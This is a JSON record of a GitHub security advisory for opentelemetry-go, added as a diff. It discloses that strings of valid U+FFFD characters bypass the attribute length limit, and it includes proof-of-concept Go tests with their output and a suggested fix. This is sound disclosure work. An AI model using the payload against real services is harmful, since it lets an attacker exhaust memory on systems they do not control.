@@ -1,0 +1,169 @@
+[
+  {
+    "ghsa_id": "GHSA-q7gw-24fr-5p69",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/open-telemetry/opentelemetry-go/security-advisories/GHSA-q7gw-24fr-5p69",
+    "html_url": "https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-q7gw-24fr-5p69",
+    "summary": "AttributeValueLengthLimit is bypassed by string values composed of valid U+FFFD runes",
+    "description": "## Summary\r\n\r\nThe `AttributeValueLengthLimit` span/log-record limit can be bypassed entirely with attribute values that consist of valid U+FFFD (REPLACEMENT CHARACTER) runes. The counting-based truncation introduced by the fix for GHSA-p9f8-wvj8-2fg8 (commit `e016a78c9`, first released in v1.33.0) has an \"optimistic\" fast path that skips every U+FFFD without counting it and without falling back to the correct slow path. A value of 1000 U+FFFD runes (3000 bytes) is stored verbatim even with a limit of 5 characters (15 bytes). The same defect affects the attribute truncation paths in `go.opentelemetry.io/otel/sdk/trace` (`sdk/internal/attrnorm`), `go.opentelemetry.io/otel/sdk/log` (`sdk/log/internal/attrnorm`), and the auto-instrumentation tracer in `go.opentelemetry.io/otel/trace` (`trace/auto.go`, introduced in `v1.35.0`).\r\n\r\nThis is an incomplete-fix issue: it is a distinct defect in the replacement code that GHSA-p9f8-wvj8-2fg8 introduced, affecting exactly the versions that advisory says are fixed (>= v1.33.0). The original advisory covers only the pre-v1.33.0 code.\r\n\r\n## Details\r\n\r\nThe shared truncation helper is generated from `internal/shared/attrnorm/truncate.go.tmpl`. In the v1.46.0 release, the generated copies are `sdk/internal/attrnorm/truncate.go` and `sdk/log/internal/attrnorm/truncate.go` (identical logic, different package names). The optimistic path (v1.46.0, `sdk/internal/attrnorm/truncate.go:175-199`) is:\r\n\r\n```go\r\n// Optimistically, assume all valid UTF-8.\r\nvar b strings.Builder\r\ncount := 0\r\nfor i, c := range s {\r\n    if c != utf8.RuneError {\r\n        count++\r\n        if count > limit {\r\n            return s[:i]\r\n        }\r\n        continue\r\n    }\r\n    _, size := utf8.DecodeRuneInString(s[i:])\r\n    if size == 1 {\r\n        // invalid encoding: fall through to the correct slow path\r\n        ...\r\n        break\r\n    }\r\n}\r\n```\r\n\r\n`range` over a string yields `utf8.RuneError` both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:\r\n\r\n1. A value made only of valid U+FFFD runes never increments `count`, so no truncation ever triggers and the value is returned unchanged, whatever its length.\r\n2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final `return s[:i]` keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by `limit`.\r\n\r\nThe OpenTelemetry specification states that truncation applies \"counting any character in it as 1\". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.\r\n\r\nCall chains (v1.46.0):\r\n\r\n- trace: `span.SetAttributes` -> `sdk/trace/span.go` (`normAttr`) -> `attrnorm.Truncate` -> `sdk/internal/attrnorm/truncate.go` (`truncate`)\r\n- log: `Record.AddAttributes` / `SetAttributes` -> `sdk/log/record.go` (`attrnorm.TruncateValue`) -> `sdk/log/internal/attrnorm/truncate.go` (`truncate`)\r\n\r\nDeduplication: GHSA-p9f8-wvj8-2fg8 describes the pre-v1.33.0 helper (`safeTruncateValidUTF8`), which gave up truncating entirely for strings containing RuneError. The rewrite in `e016a78c9` replaced that code; this report concerns the rewritten code, is present only in versions that the advisory lists as fixed, and no public issue or advisory describes it.\r\n\r\n## PoC\r\n\r\nMinimal reproduction with the published release (no repository checkout needed). Go 1.25+ is required (the release declares `go 1.25.0`; any recent toolchain auto-selects one).\r\n\r\nCreate a directory with these files.\r\n\r\n`go.mod` (then run `go mod tidy` once to fill `go.sum`):\r\n\r\n```\r\nmodule otelpoc\r\n\r\ngo 1.25.0\r\n\r\nrequire (\r\n\tgo.opentelemetry.io/otel v1.46.0\r\n\tgo.opentelemetry.io/otel/log v0.22.0\r\n\tgo.opentelemetry.io/otel/sdk v1.46.0\r\n\tgo.opentelemetry.io/otel/sdk/log v0.22.0\r\n\tgo.opentelemetry.io/otel/trace v1.46.0\r\n)\r\n```\r\n\r\n`otelgo_truncate_test.go`:\r\n\r\n```go\r\npackage otelpoc\r\n\r\nimport (\r\n\t\"context\"\r\n\t\"strings\"\r\n\t\"testing\"\r\n\t\"unicode/utf8\"\r\n\r\n\t\"go.opentelemetry.io/otel/attribute\"\r\n\tsdktrace \"go.opentelemetry.io/otel/sdk/trace\"\r\n\t\"go.opentelemetry.io/otel/sdk/trace/tracetest\"\r\n\t\"go.opentelemetry.io/otel/trace\"\r\n)\r\n\r\n// limitsWithLen returns span limits with AttributeValueLengthLimit=limit and\r\n// everything else unlimited, isolating the length-limit enforcement under test.\r\nfunc limitsWithLen(limit int) sdktrace.SpanLimits {\r\n\tlim := sdktrace.NewSpanLimits()\r\n\tlim.AttributeValueLengthLimit = limit\r\n\tlim.AttributeCountLimit = -1\r\n\tlim.AttributePerEventCountLimit = -1\r\n\tlim.AttributePerLinkCountLimit = -1\r\n\tlim.EventCountLimit = -1\r\n\tlim.LinkCountLimit = -1\r\n\treturn lim\r\n}\r\n\r\nfunc captureOneSpan(t *testing.T, limit int, attrs ...attribute.KeyValue) []attribute.KeyValue {\r\n\tt.Helper()\r\n\tsr := tracetest.NewSpanRecorder()\r\n\ttp := sdktrace.NewTracerProvider(\r\n\t\tsdktrace.WithSpanProcessor(sr),\r\n\t\tsdktrace.WithSpanLimits(limitsWithLen(limit)),\r\n\t)\r\n\tdefer func() { _ = tp.Shutdown(context.Background()) }()\r\n\r\n\ttr := tp.Tracer(\"poc\")\r\n\t_, span := tr.Start(context.Background(), \"op\")\r\n\tspan.SetAttributes(attrs...)\r\n\tspan.End()\r\n\r\n\tended := sr.Ended()\r\n\tif len(ended) != 1 {\r\n\t\tt.Fatalf(\"expected 1 ended span, got %d\", len(ended))\r\n\t}\r\n\treturn ended[0].Attributes()\r\n}\r\n\r\n// TestOT001_FFFDOnlyStringBypassesTraceLengthLimit demonstrates that a string\r\n// attribute composed of valid U+FFFD runes is stored completely untruncated\r\n// although AttributeValueLengthLimit=5.\r\nfunc TestOT001_FFFDOnlyStringBypassesTraceLengthLimit(t *testing.T) {\r\n\tconst limit = 5\r\n\tval := strings.Repeat(\"\\uFFFD\", 1000) // 1000 chars, 3000 bytes\r\n\r\n\tgot := captureOneSpan(t, limit, attribute.String(\"k\", val))\r\n\tif len(got) != 1 {\r\n\t\tt.Fatalf(\"expected 1 attribute, got %d\", len(got))\r\n\t}\r\n\tstored := got[0].Value.AsString()\r\n\tt.Logf(\"input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d\",\r\n\t\tutf8.RuneCountInString(val), len(val),\r\n\t\tutf8.RuneCountInString(stored), len(stored), limit)\r\n\t// Per OTel spec (\"counting any character in it as 1\") the stored value\r\n\t// must be at most `limit` characters (<= 15 bytes for U+FFFD).\r\n\tif maxBytes := 3 * limit; len(stored) > maxBytes {\r\n\t\tt.Fatalf(\"BYPASS: AttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)\",\r\n\t\t\tlimit, len(stored), maxBytes)\r\n\t}\r\n}\r\n\r\n// TestOT001_FFFDMixedStringOverRetains demonstrates that valid U+FFFD runes\r\n// are not counted in the optimistic truncation path: every U+FFFD adds 3\r\n// uncounted bytes to the retained value.\r\nfunc TestOT001_FFFDMixedStringOverRetains(t *testing.T) {\r\n\tconst limit = 5\r\n\tval := strings.Repeat(\"\\uFFFD\", 100) + strings.Repeat(\"A\", 6) // 106 chars, 306 bytes\r\n\r\n\tgot := captureOneSpan(t, limit, attribute.String(\"k\", val))\r\n\tstored := got[0].Value.AsString()\r\n\tt.Logf(\"input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d\",\r\n\t\tutf8.RuneCountInString(val), len(val),\r\n\t\tutf8.RuneCountInString(stored), len(stored), limit)\r\n\tif chars := utf8.RuneCountInString(stored); chars > limit {\r\n\t\tt.Fatalf(\"BYPASS: AttributeValueLengthLimit=%d but %d chars / %d bytes stored\",\r\n\t\t\tlimit, chars, len(stored))\r\n\t}\r\n}\r\n\r\n// TestOT001_ASCIIControl is the control case: plain ASCII over-limit values\r\n// ARE truncated, proving the length limit is active in the same setup.\r\nfunc TestOT001_ASCIIControl(t *testing.T) {\r\n\tconst limit = 5\r\n\tval := strings.Repeat(\"B\", 20)\r\n\r\n\tgot := captureOneSpan(t, limit, attribute.String(\"k\", val))\r\n\tstored := got[0].Value.AsString()\r\n\tt.Logf(\"input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d\",\r\n\t\tutf8.RuneCountInString(val), len(val),\r\n\t\tutf8.RuneCountInString(stored), len(stored), limit)\r\n\tif len(stored) != limit {\r\n\t\tt.Fatalf(\"control failed: ASCII value not truncated (stored %d bytes)\", len(stored))\r\n\t}\r\n}\r\n\r\n// TestOT001_EventAttributesNotLengthTruncated documents that span-event\r\n// attributes bypass AttributeValueLengthLimit entirely (no attrnorm.Truncate\r\n// call in recordingSpan.addEvent).\r\nfunc TestOT001_EventAttributesNotLengthTruncated(t *testing.T) {\r\n\tconst limit = 5\r\n\tval := strings.Repeat(\"C\", 100)\r\n\r\n\tsr := tracetest.NewSpanRecorder()\r\n\ttp := sdktrace.NewTracerProvider(\r\n\t\tsdktrace.WithSpanProcessor(sr),\r\n\t\tsdktrace.WithSpanLimits(limitsWithLen(limit)),\r\n\t)\r\n\tdefer func() { _ = tp.Shutdown(context.Background()) }()\r\n\ttr := tp.Tracer(\"poc\")\r\n\t_, span := tr.Start(context.Background(), \"op\")\r\n\tspan.AddEvent(\"ev\", trace.WithAttributes(attribute.String(\"k\", val)))\r\n\tspan.End()\r\n\r\n\tended := sr.Ended()\r\n\tevents := ended[0].Events()\r\n\tif len(events) != 1 {\r\n\t\tt.Fatalf(\"expected 1 event, got %d\", len(events))\r\n\t}\r\n\tstored := events[0].Attributes[0].Value.AsString()\r\n\tt.Logf(\"event attribute input: %d bytes; stored: %d bytes; limit=%d\", len(val), len(stored), limit)\r\n\tif len(stored) > limit {\r\n\t\tt.Logf(\"CONFIRMED: event attribute not length-truncated (%d bytes > limit %d)\", len(stored), limit)\r\n\t}\r\n}\r\n```\r\n\r\n(The `-run` pattern above selects the three truncation cases plus the control; the fourth test function is included because it is part of the exact file that produced the output below - it compiles but is not selected by the pattern, and its output does not appear.)\r\n\r\n`otelgo_log_truncate_test.go`:\r\n\r\n```go\r\npackage otelpoc\r\n\r\nimport (\r\n\t\"context\"\r\n\t\"strings\"\r\n\t\"sync\"\r\n\t\"testing\"\r\n\t\"unicode/utf8\"\r\n\r\n\t\"go.opentelemetry.io/otel/attribute\"\r\n\tapisdk \"go.opentelemetry.io/otel/log\"\r\n\tsdklog \"go.opentelemetry.io/otel/sdk/log\"\r\n)\r\n\r\ntype captureProcessor struct {\r\n\tmu   sync.Mutex\r\n\trecs []*sdklog.Record\r\n}\r\n\r\nfunc (c *captureProcessor) Enabled(context.Context, sdklog.EnabledParameters) bool { return true }\r\n\r\nfunc (c *captureProcessor) OnEmit(_ context.Context, r *sdklog.Record) error {\r\n\tc.mu.Lock()\r\n\tdefer c.mu.Unlock()\r\n\tclone := r.Clone()\r\n\tc.recs = append(c.recs, &clone)\r\n\treturn nil\r\n}\r\n\r\nfunc (c *captureProcessor) Shutdown(context.Context) error { return nil }\r\nfunc (c *captureProcessor) ForceFlush(context.Context) error {\r\n\treturn nil\r\n}\r\n\r\n// TestOT001_FFFDOnlyStringBypassesLogLengthLimit repeats the bypass against\r\n// the sdk/log attribute path (sdk/log/internal/attrnorm, same template).\r\nfunc TestOT001_FFFDOnlyStringBypassesLogLengthLimit(t *testing.T) {\r\n\tconst limit = 5\r\n\tcp := &captureProcessor{}\r\n\tlp := sdklog.NewLoggerProvider(\r\n\t\tsdklog.WithProcessor(cp),\r\n\t\tsdklog.WithAttributeValueLengthLimit(limit),\r\n\t)\r\n\tdefer func() { _ = lp.Shutdown(context.Background()) }()\r\n\r\n\tlogger := lp.Logger(\"poc\")\r\n\tvar r apisdk.Record\r\n\tr.SetSeverity(apisdk.SeverityInfo)\r\n\tr.AddAttributes(attribute.String(\"k\", strings.Repeat(\"\\uFFFD\", 1000)))\r\n\tlogger.Emit(context.Background(), r)\r\n\r\n\tcp.mu.Lock()\r\n\tif len(cp.recs) != 1 {\r\n\t\tt.Fatalf(\"expected 1 record, got %d\", len(cp.recs))\r\n\t}\r\n\trec := cp.recs[0]\r\n\tcp.mu.Unlock()\r\n\r\n\tstored := \"\"\r\n\trec.WalkAttributes(func(kv attribute.KeyValue) bool {\r\n\t\tif string(kv.Key) == \"k\" {\r\n\t\t\tstored = kv.Value.AsString()\r\n\t\t}\r\n\t\treturn true\r\n\t})\r\n\tt.Logf(\"sdk/log input: 1000 chars / 3000 bytes; stored: %d chars / %d bytes; limit=%d\",\r\n\t\tutf8.RuneCountInString(stored), len(stored), limit)\r\n\tif maxBytes := 3 * limit; len(stored) > maxBytes {\r\n\t\tt.Fatalf(\"BYPASS: sdk/log WithAttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)\",\r\n\t\t\tlimit, len(stored), maxBytes)\r\n\t}\r\n}\r\n```\r\n\r\nRun:\r\n\r\n```\r\ngo mod tidy\r\ngo test -count=1 -v -run \"TestOT001_FFFDOnlyStringBypassesTraceLengthLimit|TestOT001_FFFDMixedStringOverRetains|TestOT001_ASCIIControl|TestOT001_FFFDOnlyStringBypassesLogLengthLimit\" .\r\n```\r\n\r\nExpected output (captured against the published v1.46.0 modules; the three FAIL lines are the bypass being triggered and the PASS control proves the limit is active in the same setup; the only varying parts are the durations in parentheses and the total on the `FAIL\totelpoc` summary line):\r\n\r\n```\r\n=== RUN   TestOT001_FFFDOnlyStringBypassesLogLengthLimit\r\n    otelgo_log_truncate_test.go:66: sdk/log input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5\r\n    otelgo_log_truncate_test.go:69: BYPASS: sdk/log WithAttributeValueLengthLimit=5 but 3000 bytes stored (expected <=15)\r\n--- FAIL: TestOT001_FFFDOnlyStringBypassesLogLengthLimit (0.00s)\r\n=== RUN   TestOT001_FFFDOnlyStringBypassesTraceLengthLimit\r\n    otelgo_truncate_test.go:61: input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5\r\n    otelgo_truncate_test.go:67: BYPASS: AttributeValueLengthLimit=5 but 3000 bytes stored (expected <=15)\r\n--- FAIL: TestOT001_FFFDOnlyStringBypassesTraceLengthLimit (0.00s)\r\n=== RUN   TestOT001_FFFDMixedStringOverRetains\r\n    otelgo_truncate_test.go:81: input: 106 chars / 306 bytes; stored: 105 chars / 305 bytes; limit=5\r\n    otelgo_truncate_test.go:85: BYPASS: AttributeValueLengthLimit=5 but 105 chars / 305 bytes stored\r\n--- FAIL: TestOT001_FFFDMixedStringOverRetains (0.00s)\r\n=== RUN   TestOT001_ASCIIControl\r\n    otelgo_truncate_test.go:98: input: 20 chars / 20 bytes; stored: 5 chars / 5 bytes; limit=5\r\n--- PASS: TestOT001_ASCIIControl (0.00s)\r\nFAIL\r\nFAIL\totelpoc\t0.059s\r\nFAIL\r\n```\r\n\r\nThe mixed-string case stores 105 characters for a limit of 5: the 100 U+FFFD runes (300 uncounted bytes) are all retained, plus 5 of the 6 ASCII characters.\r\n\r\n## Impact\r\n\r\nApplications that enable `AttributeValueLengthLimit` (or `WithAttributeValueLengthLimit` for logs) to bound attribute memory do not get that bound for values containing valid U+FFFD runes. Span and log-record attribute values are routinely derived from untrusted input (HTTP headers, request bodies, database fields), so an attacker can inflate per-span memory retention linearly, defeating the memory protection the operator explicitly enabled and accumulating increased memory usage over the span/log pipeline. Confidentiality and integrity are not affected.\r\n\r\n## Suggested fix\r\n\r\nIn the optimistic loop, count every rune of size > 1 (including the legitimately encoded U+FFFD) and only divert size-1 invalid bytes to the slow path. Add regression cases for: pure U+FFFD strings, U+FFFD-dominated mixed strings, and a truncation point landing after a U+FFFD (the current `truncate_test.go` has no U+FFFD case).",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "pellared",
+      "id": 5067549,
+      "node_id": "MDQ6VXNlcjUwNjc1NDk=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/5067549?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/pellared",
+      "html_url": "https://github.com/pellared",
+      "followers_url": "https://api.github.com/users/pellared/followers",
+      "following_url": "https://api.github.com/users/pellared/following{/other_user}",
+      "gists_url": "https://api.github.com/users/pellared/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/pellared/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/pellared/subscriptions",
+      "organizations_url": "https://api.github.com/users/pellared/orgs",
+      "repos_url": "https://api.github.com/users/pellared/repos",
+      "events_url": "https://api.github.com/users/pellared/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/pellared/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-q7gw-24fr-5p69",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-28T16:43:07Z",
+    "published_at": "2026-10-28T16:43:06Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "go.opentelemetry.io/otel/sdk"
+        },
+        "vulnerable_version_range": ">= 1.33.0, < 1.47.0",
+        "patched_versions": "1.47.0",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "go.opentelemetry.io/otel/sdk/log"
+        },
+        "vulnerable_version_range": ">= 0.9.0, < 1.47.0",
+        "patched_versions": "1.47.0",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "go.opentelemetry.io/otel/trace"
+        },
+        "vulnerable_version_range": ">= 1.35.0, < 1.47.0",
+        "patched_versions": "1.47.0",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-135",
+        "name": "Incorrect Calculation of Multi-Byte String Length"
+      },
+      {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-135",
+      "CWE-770"
+    ],
+    "credits": [
+      {
+        "login": "Hama1cco",
+        "type": "reporter"
+      },
+      {
+        "login": "pellared",
+        "type": "remediation_developer"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "Hama1cco",
+          "id": 115479378,
+          "node_id": "U_kgDOBuITUg",
+          "avatar_url": "https://avatars.githubusercontent.com/u/115479378?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Hama1cco",
+          "html_url": "https://github.com/Hama1cco",
+          "followers_url": "https://api.github.com/users/Hama1cco/followers",
+          "following_url": "https://api.github.com/users/Hama1cco/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Hama1cco/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Hama1cco/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Hama1cco/subscriptions",
+          "organizations_url": "https://api.github.com/users/Hama1cco/orgs",
+          "repos_url": "https://api.github.com/users/Hama1cco/repos",
+          "events_url": "https://api.github.com/users/Hama1cco/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Hama1cco/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "pellared",
+          "id": 5067549,
+          "node_id": "MDQ6VXNlcjUwNjc1NDk=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/5067549?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/pellared",
+          "html_url": "https://github.com/pellared",
+          "followers_url": "https://api.github.com/users/pellared/followers",
+          "following_url": "https://api.github.com/users/pellared/following{/other_user}",
+          "gists_url": "https://api.github.com/users/pellared/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/pellared/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/pellared/subscriptions",
+          "organizations_url": "https://api.github.com/users/pellared/orgs",
+          "repos_url": "https://api.github.com/users/pellared/repos",
+          "events_url": "https://api.github.com/users/pellared/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/pellared/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 7,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "score": 5.3
+    }
+  }
+]
